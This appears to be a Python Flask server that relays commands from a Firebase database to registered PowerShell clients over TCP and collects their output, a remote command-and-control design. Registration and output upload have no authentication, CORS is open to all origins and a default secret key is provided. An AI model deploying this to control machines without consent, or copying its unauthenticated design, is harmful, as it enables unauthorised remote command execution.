import firebase_admin
from firebase_admin import credentials, db
from flask import Flask, jsonify, request
from flask_socketio import SocketIO, emit
from dotenv import load_dotenv
import os
from datetime import datetime
import threading
import socket
import json
from collections import defaultdict

load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'your-secret-key-here')
socketio = SocketIO(app, cors_allowed_origins="*")

# TCP Server configuration
TCP_PORT = 8081
HTTP_PORT = 5005

# Client management
client_connections = {}  # {client_name: {'socket': socket, 'address': address, 'thread': thread}}
client_listeners = {}    # {client_name: firebase_listener_reference}
client_lock = threading.Lock()
pending_sockets = []     # List of sockets waiting for registration

# Initialize Firebase
cred = credentials.Certificate(os.getenv("FIREBASE_SERVICE_ACCOUNT_KEY_PATH"))
firebase_admin.initialize_app(cred, {
    'databaseURL': os.getenv("FIREBASE_DATABASE_URL")
})

print("Firebase initialized successfully")

# Function to send message to specific client
def send_to_client(client_name, message):
    """Send message to a specific client by name"""
    with client_lock:
        if client_name in client_connections:
            try:
                client_socket = client_connections[client_name]['socket']
                client_socket.sendall((message + '\n').encode('utf-8'))
                return True
            except Exception as e:
                print(f"Error sending to client {client_name}: {e}")
                return False
        return False

# Firebase listener for specific client
def create_client_listener(client_name, client_socket):
    """Create a dedicated Firebase listener for a specific client"""
    def listener(event):
        timestamp = datetime.now().isoformat()
        
        print(f"\n[{timestamp}] Command for {client_name}")
        print(f"Path: {event.path}")
        print(f"Data: {event.data}")
        print("---")
        
        # Send command to specific client
        message = f"[{timestamp}] Firebase Change - Path: {event.path}, Data: {event.data}"
        send_to_client(client_name, message)
    
    # Listen to client-specific command path
    client_ref = db.reference(f'/{client_name}/exe/command')
    client_ref.listen(listener)
    
    return client_ref

# Handle individual client connection
def handle_client_connection(client_socket, client_address):
    """Handle a single client connection in a dedicated thread"""
    client_name = None
    
    try:
        print(f"\n[New Connection] Client connected from {client_address}")
        
        # Add to pending sockets
        with client_lock:
            pending_sockets.append({'socket': client_socket, 'address': client_address})
        
        # Send welcome message
        welcome_msg = "Connected to Firebase RTDB Command Server"
        client_socket.sendall((welcome_msg + '\n').encode('utf-8'))
        
        # Wait for client registration via HTTP
        print(f"Waiting for client registration from {client_address}...")
        
        # Keep connection alive while waiting for registration
        client_socket.settimeout(None)
        
        while True:
            # Check if this socket has been registered
            with client_lock:
                registered_client = None
                for name, info in client_connections.items():
                    if info['socket'] == client_socket:
                        registered_client = name
                        break
                
                if registered_client:
                    client_name = registered_client
                    break
            
            # Small sleep to avoid busy waiting
            threading.Event().wait(0.5)
        
        print(f"[Registered] Client '{client_name}' from {client_address}")
        
        # Keep connection alive
        while True:
            threading.Event().wait(1)
            
            # Check if client is still registered
            with client_lock:
                if client_name not in client_connections:
                    print(f"[Disconnected] Client '{client_name}' removed from registry")
                    break
    
    except Exception as e:
        print(f"[Error] Client handler error for {client_address}: {e}")
    finally:
        # Cleanup
        if client_name:
            with client_lock:
                if client_name in client_connections:
                    print(f"\n[Cleanup] Removing client '{client_name}'")
                    
                    # Stop Firebase listener
                    if client_name in client_listeners:
                        try:
                            client_listeners[client_name].close()
                            del client_listeners[client_name]
                            print(f"[Cleanup] Stopped Firebase listener for '{client_name}'")
                        except:
                            pass
                    
                    # Update Firebase status
                    try:
                        db.reference(f'/{client_name}/status').set('disconnected')
                        print(f"[Cleanup] Updated Firebase status for '{client_name}'")
                    except:
                        pass
                    
                    # Remove from connections
                    del client_connections[client_name]
        
        # Remove from pending if still there
        with client_lock:
            pending_sockets[:] = [p for p in pending_sockets if p['socket'] != client_socket]
        
        # Close socket
        try:
            client_socket.close()
        except:
            pass
        
        print(f"[Closed] Connection closed for {client_address}")

# TCP Server function
def start_tcp_server():
    """Main TCP server that accepts client connections"""
    tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tcp_server.bind(('0.0.0.0', TCP_PORT))
    tcp_server.listen(10)
    
    print(f"\n{'='*60}")
    print(f"TCP Server listening on 0.0.0.0:{TCP_PORT}")
    print(f"{'='*60}\n")
    
    while True:
        try:
            client_socket, client_address = tcp_server.accept()
            
            # Create a new thread for each client
            client_thread = threading.Thread(
                target=handle_client_connection,
                args=(client_socket, client_address),
                daemon=True
            )
            client_thread.start()
            
        except Exception as e:
            print(f"[TCP Server Error] {e}")

# Flask Routes
@app.route('/upstream', methods=['POST'])
def output_upstream():
    """Handle client registration and command output"""
    try:
        data = request.get_json()
        client_name = data.get('client_name', 'unknown')
        output = data.get('output', '')
        status = data.get('status', '')
        
        # Handle client registration
        if status == 'connected':
            print(f"[Registration] Client '{client_name}' registering...")
            
            with client_lock:
                # Find a pending socket for this client
                assigned_socket = None
                if pending_sockets:
                    # Assign the first pending socket
                    pending_info = pending_sockets.pop(0)
                    assigned_socket = pending_info['socket']
                    client_address = pending_info['address']
                    print(f"[Registration] Assigned socket from {client_address} to '{client_name}'")
                
                # Check if client already exists
                if client_name in client_connections:
                    print(f"[Registration] Client '{client_name}' already registered, updating...")
                    if assigned_socket:
                        client_connections[client_name]['socket'] = assigned_socket
                        client_connections[client_name]['address'] = client_address
                else:
                    # Register new client
                    client_connections[client_name] = {
                        'socket': assigned_socket,
                        'address': client_address if assigned_socket else None,
                        'thread': None
                    }
                
                # Start Firebase listener for this client
                if client_name not in client_listeners:
                    listener_ref = create_client_listener(client_name, 
                        client_connections[client_name].get('socket'))
                    client_listeners[client_name] = listener_ref
                    print(f"[Firebase] Started listener for '{client_name}' at /{client_name}/exe/command")
                
                # Update Firebase status
                db.reference(f'/{client_name}/status').set('connected')
                db.reference(f'/{client_name}/last_seen').set(datetime.now().isoformat())
            
            print(f"[Registration] Client '{client_name}' registered successfully")
            print(f"[Status] Total clients: {len(client_connections)}")
        
        # Handle command output
        if output:
            print(f"OUTPUT:\n{output}")
            
            # Upload to Firebase
            output_ref = db.reference(f'/{client_name}/exe/output')
            output_ref.set(output)
            
            # Update last seen
            db.reference(f'/{client_name}/last_seen').set(datetime.now().isoformat())
        
        print("="*60 + "\n")
        
        return jsonify({'status': 'success', 'message': 'Data received'}), 200
    
    except Exception as e:
        print(f"[Error] Processing upstream data: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/clients', methods=['GET'])
def list_clients():
    """List all connected clients"""
    with client_lock:
        clients = []
        for name, info in client_connections.items():
            clients.append({
                'name': name,
                'address': str(info.get('address', 'unknown')),
                'connected': info.get('socket') is not None
            })
        return jsonify({'clients': clients, 'count': len(clients)}), 200

@app.route('/status', methods=['GET'])
def status():
    """Server status"""
    with client_lock:
        return jsonify({
            'status': 'running',
            'connected_clients': len(client_connections),
            'tcp_port': TCP_PORT,
            'http_port': HTTP_PORT
        }), 200

# WebSocket events (optional, for monitoring)
@socketio.on('connect')
def handle_connect():
    print(f"[WebSocket] Client connected")
    emit('connection_response', {'status': 'connected'})

@socketio.on('disconnect')
def handle_disconnect():
    print("[WebSocket] Client disconnected")

if __name__ == '__main__':
    # Start TCP server in background thread
    tcp_thread = threading.Thread(target=start_tcp_server, daemon=True)
    tcp_thread.start()
    
    # Get HTTP port from environment
    port = int(os.getenv('PORT', HTTP_PORT))
    
    print("\n" + "=" * 60)
    print("Firebase RTDB Multi-Client Command Server")
    print("=" * 60)
    print(f"HTTP/WebSocket Server: http://0.0.0.0:{port}")
    print(f"TCP Command Server: 0.0.0.0:{TCP_PORT}")
    print(f"Firebase URL: {os.getenv('FIREBASE_DATABASE_URL')}")
    print("=" * 60)
    print("\nEach client gets:")
    print("  - Dedicated TCP connection")
    print("  - Separate thread handler")
    print("  - Individual Firebase listener at /<client_name>/exe/command")
    print("  - Isolated command/output paths")
    print("=" * 60)
    print("\nPowerShell clients connect with:")
    print(f"  .\\client.ps1 <server_ip> {TCP_PORT} {port}")
    print("=" * 60 + "\n")
    
    try:
        socketio.run(app, host='0.0.0.0', port=port, debug=False, 
                    use_reloader=False, allow_unsafe_werkzeug=True)
    except KeyboardInterrupt:
        print("\n[Shutdown] Received interrupt signal...")
